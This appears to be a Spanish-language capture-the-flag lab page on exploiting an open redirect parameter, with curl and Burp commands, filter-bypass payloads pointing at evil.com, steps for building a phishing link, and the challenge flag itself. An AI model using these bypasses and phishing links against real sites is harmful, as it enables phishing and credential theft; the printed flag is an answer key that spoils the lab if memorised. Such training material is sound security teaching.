Objetivo

El parámetro url redirige sin validar el destino. Fuerza una redirección a un dominio externo: cuando lo logras, el servidor añade la flag en la cabecera de respuesta X-HackLabs-Flag.

Flag: HL{0p3n_r3d1r3c7_ph15h1n9_0wn3d} — valídala en la barra lateral.

Este portal redirige a los usuarios tras completar acciones. El parámetro de destino no está validado.

Pasos de explotación

  1. Identifica el endpoint vulnerable: /open_redirect?url= acepta una URL y redirige al usuario a ella.
  2. Comprueba la redirección con curl: 
    curl -v "http://TARGET_IP/open_redirect?url=https://evil.com"
    Busca la cabecera Location: https://evil.com en la respuesta HTTP 302.
  3. Easy: No hay filtro — cualquier URL externa funciona: 
    /open_redirect?url=https://evil.com
  4. Medium: Bloquea URLs que empiecen con http:// o https:// externo. Bypass con protocol-relative: 
    # Protocol-relative — el navegador redirige a http://evil.com
/open_redirect?url=//evil.com

# Backslash — el navegador normaliza \ a / → //evil.com
/open_redirect?url=/\evil.com
  5. Hard: Bloquea dominios externos + protocol-relative (//). Bypass con backslash: 
    # El filtro comprueba startswith("//") pero no "/\\"
# El navegador normaliza \ a / → Location: //evil.com → redirect externo
/open_redirect?url=/\evil.com
  6. Verifica en Burp Suite Repeater: 
    GET /open_redirect?url=/\evil.com HTTP/1.1
Host: TARGET_IP

# Respuesta: HTTP 302 Location: /\evil.com
# El navegador normaliza a //evil.com → redirect a evil.com
  7. Construye un enlace de phishing creíble: 
    http://TARGET_IP/open_redirect?url=//evil.com/login
    La víctima ve el dominio de confianza y hace clic, pero termina en el sitio del atacante.
  8. Obtén la flag dedicada validando la cabecera de respuesta cuando la redirección es externa: 
    curl -I "{{ target_base }}/open_redirect?url=//evil.com"
# X-HackLabs-Flag: HL{0p3n_r3d1r3c7_ph15h1n9_0wn3d}
